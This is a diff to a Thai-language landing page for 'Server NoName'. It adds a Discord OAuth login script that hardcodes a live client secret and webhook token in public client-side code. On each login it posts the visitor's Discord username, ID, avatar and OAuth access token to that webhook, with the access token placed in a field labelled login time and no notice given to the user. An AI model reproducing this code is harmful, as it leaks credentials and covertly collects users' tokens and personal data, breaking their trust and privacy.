@@ -172,7 +172,7 @@
                 <center>
                     <img src="assets/icon/images.png" class="float-ani" width="300">
                     <h1 class="text-ani fw-bold mb-3">Server NoName</h1>
-                    <a href="home.html" class="btn-main">เข้าสู่เว็บไซต์</a>
+                    <a onclick="loginWithDiscord()" style="cursor: pointer;" class="btn-main">เข้าสู่เว็บไซต์</a>
                 </center>
             </div>
         </div>
@@ -220,7 +220,70 @@
             filter: drop-shadow(0 0 .5em #fff564aa);
             }
         </style>
-    </footer
+    </footer>
+    <script>
+        const CLIENT_ID = "1338841311478022164";
+        const REDIRECT_URI = "https://unknownhat832553.github.io/Server-NoName/";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1338100822734536766/2E_STl59I0kATK7_-uOSZfRa5DooCkUTU39-tGmSR8Lv35WNDROM3kE0Np2JTBicyVOu";
+        const AUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
+        function loginWithDiscord() {
+            window.location.href = AUTH_URL;
+        }
+        async function sendToWebhook(userData, loginTime) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🔹 มีคนล็อกอิน",
+                            color: 3447003,
+                            fields: [
+                                { name: "👤 ชื่อ", value: `${userData.username}#${userData.discriminator}`, inline: true },
+                                { name: "🆔 ID", value: userData.id, inline: true },
+                                { name: "🕒 เวลาล็อกอิน", value: loginTime, inline: true }
+                            ],
+                            thumbnail: { url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` },
+                            footer: { text: "ล็อกอินผ่าน OAuth2" }
+                        }]
+                    })
+                });
+                console.log("✅ ส่งข้อมูลไปยัง Webhook สำเร็จ!");
+            } catch (error) {
+                console.error("❌ ส่งข้อมูลไปยัง Webhook ล้มเหลว:", error);
+            }
+        }
+        async function fetchUserData(code) {
+            try {
+                const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams({
+                        client_id: CLIENT_ID,
+                        client_secret: "ixfZE4L9jJ2kXDT0qXCVdfcTM3UiO9D8",
+                        grant_type: "authorization_code",
+                        code: code,
+                        redirect_uri: REDIRECT_URI
+                    })
+                });
+                const tokenData = await tokenResponse.json();
+                const accessToken = tokenData.access_token;
+                const userResponse = await fetch("https://discord.com/api/users/@me", {
+                    headers: { Authorization: `Bearer ${accessToken}` }
+                });
+                const userData = await userResponse.json();
+                // ส่งข้อมูลไปที่ Discord Webhook
+                sendToWebhook(userData, accessToken);
+            } catch (error) {
+                console.error("❌ ดึงข้อมูลผู้ใช้ล้มเหลว:", error);
+            }
+        }
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get("code");
+            if (code) fetchUserData(code);
+        };
+    </script>
     <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"916393662910ee4a","version":"2025.1.0","r":1,"token":"b0f2b8c121c0488a97c5214aaf4c351a","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
 </body>
 </html>
